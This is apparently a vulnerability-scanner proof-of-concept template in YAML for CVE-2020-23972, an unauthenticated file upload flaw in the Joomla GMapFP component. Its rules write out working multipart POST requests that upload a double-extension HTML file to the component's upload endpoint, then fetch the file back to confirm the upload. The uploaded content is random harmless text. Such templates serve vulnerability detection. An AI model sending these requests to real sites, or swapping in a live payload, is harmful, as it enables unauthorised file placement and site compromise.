name: poc-yaml-joomla-cve-2020-23972-unauthenticated-fileupload
binding: 95a74d0e-a65d-42d0-8324-da11ca7a98d0
manual: true
detail:
    author: Xz
    links:
        - https://www.exploit-db.com/exploits/49129
        - https://raw.githubusercontent.com/me4yoursecurity/Reports/master/README.md
        - http://packetstormsecurity.com/files/159072/Joomla-GMapFP-J3.5-J3.5F-Arbitrary-File-Upload.html
        - https://nvd.nist.gov/vuln/detail/CVE-2020-23972
    vulnerability:
        id: CT-73995
        level: high
    description: Joomla! Component GMapFP 3.5 is vulnerable to arbitrary file upload vulnerabilities. An attacker can access the upload function of the application
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    random1: bytes(randomLowercase(10))
    random2: bytes(randomLowercase(10))
    random3: bytes(randomLowercase(20))
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /index.php?option=comgmapfp&controller=editlieux&tmpl=component&task=upload_image
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{random1}}
            body: |
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="option"

                com_gmapfp
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="image1"; filename="{{random2}}.html.gif"
                Content-Type: text/html

                {{random3}}

                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="no_html"

                no_html
                ------WebKitFormBoundary{{random1}}--
        expression: response.status == 200 && response.body.bcontains(b"addphoto") && response.body.bcontains(random2)
    r1:
        request:
            cache: true
            method: POST
            path: /index.php?option=com_gmapfp&controller=editlieux&tmpl=component&task=upload_image
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{random1}}
            body: |
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="option"

                com_gmapfp
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="image1"; filename="{{random2}}.html.gif"
                Content-Type: text/html

                {{random3}}

                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="no_html"

                no_html
                ------WebKitFormBoundary{{random1}}--
        expression: response.status == 200 && response.body.bcontains(b"addphoto") && response.body.bcontains(random2)
    r2:
        request:
            cache: true
            method: GET
            path: /images/gmapfp/{{random2}}.html.gif
        expression: response.status == 200 && response.body.bcontains(random3)
expression: (r0() || r1()) && r2()
